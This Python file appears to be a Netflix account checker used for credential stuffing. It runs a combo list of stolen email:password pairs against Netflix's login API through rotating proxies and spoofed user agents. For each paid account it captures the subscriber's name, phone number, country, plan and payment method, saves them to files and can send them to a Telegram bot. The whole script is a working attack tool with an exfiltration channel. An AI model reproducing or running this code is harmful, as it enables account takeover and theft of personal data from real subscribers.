import concurrent.futures
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning # pip install --upgrade certifi
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from requests.exceptions import RequestException
from getuseragent import UserAgent
import time,sys
import random

from colorama import init, Fore, Back, Style

init()

RED = Fore.RED
RED2 = Fore.LIGHTRED_EX  
GREEN = Fore.GREEN
BLUE2 = Fore.BLUE
BLUE = Fore.LIGHTBLUE_EX  
PURPLE = Fore.MAGENTA
YELLOW = Fore.YELLOW
RESET_COLOR = Style.RESET_ALL


def hamo_logo(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.009)

logo = (f'''
        Welcome To config Netflix !!
        full capture save in 
        paid.txt - free.txt
        Send to Telegram bot
        (optional) You can 
        use a proxy or a VPN
        TeLe? > @b_vvb''')


hamo_logo(logo)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0025)

print()
lol = str("=" * 65)
jalan(f"{RED}  {lol}")
#################################################################################
countries_dict  = {'AF': 'Afghanistan', 'AX': 'Åland Islands', 'AL': 'Albania', 'DZ': 'Algeria', 'AS': 'American Samoa', 'AD': 'Andorra', 'AO': 'Angola', 'AI': 'Anguilla', 'AQ': 'Antarctica', 'AG': 'Antigua and Barbuda', 'AR': 'Argentina', 'AM': 'Armenia', 'AW': 'Aruba', 'AU': 'Australia', 'AT': 'Austria', 'AZ': 'Azerbaijan', 'BS': 'Bahamas', 'BH': 'Bahrain', 'BD': 'Bangladesh', 'BB': 'Barbados', 'BY': 'Belarus', 'BE': 'Belgium', 'BZ': 'Belize', 'BJ': 'Benin', 'BM': 'Bermuda', 'BT': 'Bhutan', 'BO': '"Bolivia: Plurinational State of"', 'BQ': '"Bonaire: Sint Eustatius and Saba"', 'BA': 'Bosnia and Herzegovina', 'BW': 'Botswana', 'BV': 'Bouvet Island', 'BR': 'Brazil', 'IO': 'British Indian Ocean Territory', 'BN': 'Brunei Darussalam', 'BG': 'Bulgaria', 'BF': 'Burkina Faso', 'BI': 'Burundi', 'KH': 'Cambodia', 'CM': 'Cameroon', 'CA': 'Canada', 'CV': 'Cape Verde', 'KY': 'Cayman Islands', 'CF': 'Central African Republic', 'TD': 'Chad', 'CL': 'Chile', 'CN': 'China', 'CX': 'Christmas Island', 'CC': 'Cocos (Keeling) Islands', 'CO': 'Colombia', 'KM': 'Comoros', 'CG': 'Congo', 'CD': '"Congo: the Democratic Republic of the"', 'CK': 'Cook Islands', 'CR': 'Costa Rica', 'CI': "CÃ´te d'Ivoire", 'HR': 'Croatia', 'CU': 'Cuba', 'CW': 'CuraÃ§ao', 'CY': 'Cyprus', 'CZ': 'Czech Republic', 'DK': 'Denmark', 'DJ': 'Djibouti', 'DM': 'Dominica', 'DO': 'Dominican Republic', 'EC': 'Ecuador', 'EG': 'Egypt', 'SV': 'El Salvador', 'GQ': 'Equatorial Guinea', 'ER': 'Eritrea', 'EE': 'Estonia', 'ET': 'Ethiopia', 'FK': 'Falkland Islands (Malvinas)', 'FO': 'Faroe Islands', 'FJ': 'Fiji', 'FI': 'Finland', 'FR': 'France', 'GF': 'French Guiana', 'PF': 'French Polynesia', 'TF': 'French Southern Territories', 'GA': 'Gabon', 'GM': 'Gambia', 'GE': 'Georgia', 'DE': 'Germany', 'GH': 'Ghana', 'GI': 'Gibraltar', 'GR': 'Greece', 'GL': 'Greenland', 'GD': 'Grenada', 'GP': 'Guadeloupe', 'GU': 'Guam', 'GT': 'Guatemala', 'GG': 'Guernsey', 'GN': 'Guinea', 'GW': 'Guinea-Bissau', 'GY': 'Guyana', 'HT': 'Haiti', 'HM': 'Heard Island and McDonald Islands', 'VA': 'Holy See (Vatican City State)', 'HN': 'Honduras', 'HK': 'Hong Kong', 'HU': 'Hungary', 'IS': 'Iceland', 'IN': 'India', 'ID': 'Indonesia', 'IR': '"Iran: Islamic Republic of"', 'IQ': 'Iraq', 'IE': 'Ireland', 'IM': 'Isle of Man', 'IL': 'Israel', 'IT': 'Italy', 'JM': 'Jamaica', 'JP': 'Japan', 'JE': 'Jersey', 'JO': 'Jordan', 'KZ': 'Kazakhstan', 'KE': 'Kenya', 'KI': 'Kiribati', 'KP': '"Korea: Democratic People\'s Republic of"', 'KR': '"Korea: Republic of"', 'KW': 'Kuwait', 'KG': 'Kyrgyzstan', 'LA': "Lao People's Democratic Republic", 'LV': 'Latvia', 'LB': 'Lebanon', 'LS': 'Lesotho', 'LR': 'Liberia', 'LY': 'Libya', 'LI': 'Liechtenstein', 'LT': 'Lithuania', 'LU': 'Luxembourg', 'MO': 'Macao', 'MK': '"Macedonia: the Former Yugoslav Republic of"', 'MG': 'Madagascar', 'MW': 'Malawi', 'MY': 'Malaysia', 'MV': 'Maldives', 'ML': 'Mali', 'MT': 'Malta', 'MH': 'Marshall Islands', 'MQ': 'Martinique', 'MR': 'Mauritania', 'MU': 'Mauritius', 'YT': 'Mayotte', 'MX': 'Mexico', 'FM': '"Micronesia: Federated States of"', 'MD': '"Moldova: Republic of"', 'MC': 'Monaco', 'MN': 'Mongolia', 'ME': 'Montenegro', 'MS': 'Montserrat', 'MA': 'Morocco', 'MZ': 'Mozambique', 'MM': 'Myanmar', 'NA': 'Namibia', 'NR': 'Nauru', 'NP': 'Nepal', 'NL': 'Netherlands', 'NC': 'New Caledonia', 'NZ': 'New Zealand', 'NI': 'Nicaragua', 'NE': 'Niger', 'NG': 'Nigeria', 'NU': 'Niue', 'NF': 'Norfolk Island', 'MP': 'Northern Mariana Islands', 'NO': 'Norway', 'OM': 'Oman', 'PK': 'Pakistan', 'PW': 'Palau', 'PS': '"Palestine: State of"', 'PA': 'Panama', 'PG': 'Papua New Guinea', 'PY': 'Paraguay', 'PE': 'Peru', 'PH': 'Philippines', 'PN': 'Pitcairn', 'PL': 'Poland', 'PT': 'Portugal', 'PR': 'Puerto Rico', 'QA': 'Qatar', 'RE': 'RÃ©union', 'RO': 'Romania', 'RU': 'Russian Federation', 'RW': 'Rwanda', 'BL': 'Saint BarthÃ©lemy', 'SH': '"Saint Helena: Ascension and Tristan da Cunha"', 'KN': 'Saint Kitts and Nevis', 'LC': 'Saint Lucia', 'MF': 'Saint Martin (French part)', 'PM': 'Saint Pierre and Miquelon', 'VC': 'Saint Vincent and the Grenadines', 'WS': 'Samoa', 'SM': 'San Marino', 'ST': 'Sao Tome and Principe', 'SA': 'Saudi Arabia', 'SN': 'Senegal', 'RS': 'Serbia', 'SC': 'Seychelles', 'SL': 'Sierra Leone', 'SG': 'Singapore', 'SX': 'Sint Maarten (Dutch part)', 'SK': 'Slovakia', 'SI': 'Slovenia', 'SB': 'Solomon Islands', 'SO': 'Somalia', 'ZA': 'South Africa', 'GS': 'South Georgia and the South Sandwich Islands', 'SS': 'South Sudan', 'ES': 'Spain', 'LK': 'Sri Lanka', 'SD': 'Sudan', 'SR': 'Suriname', 'SJ': 'Svalbard and Jan Mayen', 'SZ': 'Swaziland', 'SE': 'Sweden', 'CH': 'Switzerland', 'SY': 'Syrian Arab Republic', 'TW': '"Taiwan: Province of China"', 'TJ': 'Tajikistan', 'TZ': '"Tanzania: United Republic of"', 'TH': 'Thailand', 'TL': 'Timor-Leste', 'TG': 'Togo', 'TK': 'Tokelau', 'TO': 'Tonga', 'TT': 'Trinidad and Tobago', 'TN': 'Tunisia', 'TR': 'Turkey', 'TM': 'Turkmenistan', 'TC': 'Turks and Caicos Islands', 'TV': 'Tuvalu', 'UG': 'Uganda', 'UA': 'Ukraine', 'AE': 'United Arab Emirates', 'GB': 'United Kingdom', 'US': 'United States', 'UM': 'United States Minor Outlying Islands', 'UY': 'Uruguay', 'UZ': 'Uzbekistan', 'VU': 'Vanuatu', 'VE': '"Venezuela: Bolivarian Republic of"', 'VN': 'Viet Nam', 'VG': '"Virgin Islands: British"', 'VI': '"Virgin Islands: U.S."', 'WF': 'Wallis and Futuna', 'EH': 'Western Sahara', 'YE': 'Yemen', 'ZM': 'Zambia', 'ZW': 'Zimbabwe'}


paid = 0
free = 0
error = 0
retry = 0

###############################################################################


fi = input(f'[?] file name > ')
askk = input(f"[?] Do you want to send hits to Telegram? Y/N > ")
if askk.lower() == 'y'or askk.lower() == 'yes':
    to = input(f"[?] ToKeN? > ")
    id = input(f"[?] iD? > ")

def ask_1_2():
    print(f'''[!] Note : The proxy or VPN must be located in the combo country .
    [1] Use Surfshark or Cyberghost VPN or paid vpn .
    [2] Proxy .''')
    try:
        askkkk = int(input(f"[?] Choose 1 or 2? 1/2 > "))
        if askkkk == 1 or askkkk == 2:
            return askkkk
        else:
            print()
            ask_1_2()
    except ValueError:
        print()
        ask_1_2()

ask12 = ask_1_2()

if ask12 == 2:
    hamo = input(f"[?] Proxy http file > ")

print()
jalan(f"{RED}  {lol}")
print()

if ".txt" not in fi:
    fi = fi + '.txt'

if ask12 == 2:
    if ".txt" not in hamo:
        hamo = hamo + '.txt'

    with open(hamo,'r',encoding="utf-8") as file:
        hamo = file.readlines()
        hamo = [line.rstrip() for line in hamo]

    proxy = []
    for hm in hamo:
        try:
            if hm:
                if ")" in hm and "(" in hm:
                    hm = hm.replace(')',"").replace('(',"")
                if hm.count(':') == 1:
                    proxyy = hm
                elif hm.count(':') == 3:
                    hmm = hm.split(':')
                    proxyy = f'{hmm[2]}:{hmm[3]}@{hmm[0]}:{hmm[1]}'
                proxy.append(proxyy)
        except Exception as e:
            print(f"error in split proxy : {e}")
else:
    proxy = ['']

        

with open(fi,'r',encoding="utf-8") as file:
    lino = file.readlines()
    lino = [line.rstrip() for line in lino]
random.shuffle(lino)


def perform_login_wrapper(args):
    email, password, proxy = args
    perform_login(email, password, proxy)

def perform_login(USER, PASS, proxy):
    global paid,free,error,retry
    try:
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning # pip install --upgrade certifi
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.session()
        if len(proxy) == 1 and proxy[0] == '':
            pass
        else:
            pr = random.choice(proxy)
            r.proxies = {
                'http': f'http://{pr}',
                'https': f'https://{pr}'
            }
        ua = UserAgent("ios").Random()

        headers = {
            'User-Agent': f'{ua}',
            'Pragma': 'no-cache',
            'Accept': '*/*',
        }

        response = r.get('https://www.netflix.com/', headers=headers)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'api-global.netflix.com',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': f'{ua}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        data = f'email={USER}&password={PASS}&setCookies=true'

        response = r.post('https://api-global.netflix.com/account/auth', headers=headers,data=data,verify=False)
        if 'Incorrect email address or password' in response.text or 'Missing password' in response.text or 'NetflixId":null,"user":{"' in response.text:
            error += 1
            print(f"\r  {BLUE2}[=] {RESET_COLOR}{USER}:{PASS} {BLUE2}|{GREEN}Paid : {paid} {BLUE2}|{RED}Free : {free} {BLUE2}|{RED2}Error : {error} {BLUE2}|{BLUE}Retry : {retry}   ",end='')
        elif 'Invalid Request' in response.text:
            error += 1
            print(f"\r  {BLUE2}[=] {RESET_COLOR}{USER}:{PASS} {BLUE2}|{GREEN}Paid : {paid} {BLUE2}|{RED}Free : {free} {BLUE2}|{RED2}Error : {error} {BLUE2}|{BLUE}Retry : {retry}   ",end='')
        elif 'FORMER_MEMBER' in response.text or 'NEVER_MEMBER' in response.text:
            free += 1
            with open('free.txt','a',encoding='utf-8') as f:
                f.write(f'{USER}:{PASS}\n')
            print(f"\r  {BLUE2}[=] {RESET_COLOR}{USER}:{PASS} {BLUE2}|{GREEN}Paid : {paid} {BLUE2}|{RED}Free : {free} {BLUE2}|{RED2}Error : {error} {BLUE2}|{BLUE}Retry : {retry}   ",end='')
        elif 'CURRENT_MEMBER' in response.text:
            paid += 1
            try:
                first_name = response.json()['user']['firstName']
            except:
                first_name = ''
            try:
                last_name = response.json()['user']['lastName']
            except:
                last_name = ''
            with open('paid.txt','a',encoding='utf-8') as f:
                f.write(f'{USER}:{PASS}\n')
            print(f"\r  {BLUE2}[=] {RESET_COLOR}{USER}:{PASS} {BLUE2}|{GREEN}Paid : {paid} {BLUE2}|{RED}Free : {free} {BLUE2}|{RED2}Error : {error} {BLUE2}|{BLUE}Retry : {retry}   ",end='')
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': '*/*'
            }
            response = r.get('https://www.netflix.com/YourAccount', headers=headers).text
            try:
                Netflix = response.split('data-uia="member-since"><div class="account-section-membersince--svg"></div>')[1].split('</div>')[0]
            except:
                Netflix = ''
            try:
                Country = response.split('","currentCountry":"')[1].split('"')[0]
                Country = countries_dict.get(Country, 'Country not found')
            except:
                Country = ''
            try:
                Phone = response.split('"phoneNumber":"')[1].split('",')[0]
                Phone = Phone.replace('\x20','')
            except:
                Phone = ''
            try:
                Subscription = response.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
            except:
                Subscription = ''
            try:
                Video_quality = response.split('},"videoQuality":{"fieldType":"String","value":"')[1].split('"}')[0]
            except:
                Video_quality = ''
            try:
                Max_Streams = response.split('"maxStreams":{"fieldType":"Numeric","value":')[1].split('},"videoQuality":')[0]
            except:
                Max_Streams = ''
            try:
                price = response.split(',"planPrice":{"fieldType":"String","value":"')[1].split('"},')[0]
            except:
                price = ''
            try:
                Payment_Method = response.split('"paymentMethod":{"fieldType":"String","value":"')[1].split('"},')[0]
            except:
                Payment_Method = ''
            print(f'\n{GREEN} {USER}:{PASS} | Country = {Country} | Max Streams = {Max_Streams} | first Name = {first_name} | last Name = {last_name} | Phone = {Phone} | Subscription = {Subscription} | Payment method = {Payment_Method} | Video quality = {Video_quality} | price = {price} | Netflix = {Netflix} | by = @HAMO_BACK\n')
            with open('paid.txt','a',encoding='utf-8') as f:
                f.write(f'{USER}:{PASS} | Country = {Country} | Max Streams = {Max_Streams} | first Name = {first_name} | last Name = {last_name} | Phone = {Phone} | Subscription = {Subscription} | Payment method = {Payment_Method} | Video quality = {Video_quality} | price = {price} | Netflix = {Netflix} | by = @HAMO_BACK\n')
            if askk.lower() == 'y'or askk.lower() == 'yes':
                try:
                    requests.post(f"""https://api.telegram.org/bot{to}/sendMessage?chat_id={id}&text=
New Hits : {USER}:{PASS}
| Country = {Country}
| Max Streams = {Max_Streams}
| first Name = {first_name}
| last Name = {last_name}
| Phone = {Phone}
| Subscription = {Subscription}
| Payment method = {Payment_Method}
| Video quality = {Video_quality}
| price = {price}
| Netflix = {Netflix}
| me = @b_vvb
""")
                except:
                    pass
            print(f"\r  [=] {USER}:{PASS} | Paid : {paid} | Free : {free} | Error : {error} | Retry : {retry}   ",end='')
    except RequestException as e:
        retry += 1
        print(f"\r  [=] {USER}:{PASS} | Paid : {paid} | Free : {free} | Error : {error} | Retry : {retry}   ",end='')
        perform_login(USER, PASS, proxy)


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        args_list = []

        for line_number, line in enumerate(lino, start=1):
            parts = line.strip().split(":")
            if len(parts) == 2:
                email, password = parts
                args_list.append((email, password, proxy))
            else:
                print(f"Skipping line {line_number}: {line}")
        print()
        jalan(f"{RED}  {lol}")
        print()

        futures = {executor.submit(perform_login_wrapper, args): args for args in args_list}
        
        for future in concurrent.futures.as_completed(futures):
            args = futures[future]
            try:
                future.result()
            except Exception as exc:
                print(f"Exception for {args}: {exc}")

if __name__ == "__main__":
    main()